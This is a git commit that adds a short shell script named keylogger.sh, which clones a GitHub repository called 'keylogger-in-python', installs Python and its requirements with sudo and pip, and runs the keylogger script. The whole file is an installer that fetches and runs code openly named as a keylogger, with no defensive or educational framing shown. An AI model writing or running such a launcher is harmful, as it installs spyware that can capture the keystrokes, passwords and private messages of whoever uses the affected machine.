2c2904007047b02fe99bbedc0ef91a148dc7bb52
Sumalya Chatterjee <105884682+R3DHULK@users.noreply.github.com>
2022-11-09 21:08:34 +0530

    Keylogger

---
+++ keylogger.sh
@@ -0,0 +1,19 @@
+clear
+
+git clone https://github.com/R3DHULK/keylogger-in-python
+
+clear
+
+cd keylogger-in-python
+
+clear
+
+sudo apt install python
+
+clear
+
+python -m pip install -r requirements.txt
+
+clear
+
+python py-keylogger.py
